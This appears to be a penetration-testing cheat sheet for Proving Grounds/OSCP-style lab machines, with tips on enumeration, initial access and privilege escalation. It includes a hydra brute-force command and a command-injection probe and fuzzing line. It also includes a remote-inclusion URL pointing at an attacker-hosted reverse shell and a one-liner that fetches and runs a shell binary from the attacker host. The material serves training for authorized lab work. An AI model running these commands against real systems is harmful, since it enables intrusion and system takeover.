        Monitor web requests with BurpSuite

        Re-look at all open ports and services, don't be rabbit holed; if there are avail logon service, maybe you need to find credentials.

        When you directory bruteforce, use feroxbuster and do it again with the -f flag
            Remember to adjust the wordlists if you initially dont find anything

        Remember to search for subdomains

        Example the mind map for path ideas: https://coggle.it/diagram/Ya0bMjOIUnwA_6bo/t/enumeration-mindmap

        --> Use multiple privesc scripts <--

        Know the delta between public ports and ports only open to 127.0.0.1

        Don't spin wheels on other routes if something has a known exploit to root and it's a 10 pointer.
        
        Check version numbers to ensure something isn't a false flag.
        
        Consider similar protocols. If you get an SSH key, try using it over SCP.
        
        Type version numbers carefully!
        
        For hydra always do -e nsr. Example: hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ftp -vV -f -e nsr -I
        
        Look for auth-owners in nmap to get usernames.
        
        Always be in a directory on kali that's writable to download files.
        
        FTP brute force "admin" and the site name.

        FTP Toggle passive mode.

        FTP Download files in binary mode
        
        Search Metasploit modules for exploit ideas 
        
        Search a software's Github page for version files that would give specific information.
        
        See Proving Grounds' Dibble for node.js RCE.
        
        Review page source code for commented out areas for every page.
        
        Guess parameters. If there's a POST forgot_pass.php with an email param, try GET /forgot_pass.php?email=%0aid.
        
        Parameter/command injection fuzzing:
        Payload list: https://github.com/payloadbox/command-injection-payload-list
        â€‹
        ffuf -w cmd-wordlist.txt -u 192.168.1.1/under_construction/forgot.php?email=abcdFUZZde
        See Proving Grounds' Hetemit for an example

        When brute forcing credentials, guess the software name as the username and password.

        When dealing with file type uploads, try specifying just the header like GIF89a;. Files pulled from Google Images could be made different and not identified as a GIF.

    - description: Initial Access
      code: |
        Search for http://site/[hostname] if you can't find a directory or software you think should exist.
        
        Try both GET and POST methods for all URLs given that may be blocking data via a particular HTTP method.
        Fuzz parameters with ffuf.

        Examine response headers for minor custom errors.

        Use multiple tools - feroxbuster, wfuzz (subdomains), nikto, wpscan, droopscan, nmap http, 

        Getting a shell
        To save time, upload a web shell instead of manually executing PHP commands.
        
        Some PHP local file inclusion vulnerabilities can reference remote resources with ?path=http://[kali ip]/rev-shell.php.
        
        Break up an exploit. Use Wireshark to watch for ICMP pings back home instead of going for a reverse shell right away.
        
        Instead of sharing a full rev shell payload, download an elf, +x, and execute it all in 1 command: wget -P /tmp http://kali/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
        
        If a CMS has an RCE, look closely at what/where it's implemented. If it has /skins/ in a proof-of-concept URL, check for that functionality in admin panel or in online documentation.
        
        When calling back on a port (web request, shell, etc.) try multiple ports if the first fails.
        
        Piece together multiple initial access exploits. If one creates a web account and tries for a shell and fails, add exit(0) in the python script after the account is created and use the credentials for another exploit.
        
        Use the same ports the box has open for shell callbacks.
        
        Try at least 4 ports and ping when trying to get a callback.
        
        If you can control data being read to the server, always consider serialization.
        
        Always test payloads locally, especially if it's blind.

        Consider where can you write data to that's then read back in to the server.

    - description: Windows Privesc
      code: |
        Explore the C:\ drive root. Some scheduled tasks can't be seen as a low level user could be located at C:\.
        
        Always test a reverse shell on a windows box when attempting to get a shell.
        
        Explore alternatives to a reverse shell. Leverage exposed remote access protocols. For example, if a reverse shell doesn't work, execute a command to change the Administrator password and used smbexec to auth.
        
        Identify all users. Attempt to brute force authentication via RDP

        Always view "C:\program files" and "C:\program files (x86)" for installed apps.

    - description: Linux Privesc
      code: |  
        Privesc scripts aren't always right:
            e.g. a decoy exist item in crontab when sudo -l reveals a process dumper used to get credentials from memory.

        If a process dumper is available, don't Google too deep. See if there are custom "password" processes to target.

        su root is the best way to switch to root if you have a password but aren't in root group.

        Identify all users. Attempt to brute force auth ssh if /home or /etc/passwd is pulled.

        Always run echo $PATH to show available commands/locations.

        Docker - see Proving Grounds' Sirol/Escape box.

        If a user is in a group, it's probably for a reason.

        Fully understand software that's related to a user's group (e.g. fail2ban group).
        
        Use pspy to spy on processes and cronjobs you may not be able to see
        
        Run groups.
        
        cat ~/.profile && cat ~/.bashrc.
        
        If running as www-data, always inspect the contents of html or the application, look for commented out passwords.
        
        If another user exist, always su [user] with no password and their name as the password.
        
        Check /var/backups.
        
        Custom SUIDs won't be highlighted as linpeas and other privesc scripts don't know what they are.
            Examine each and every SUID!
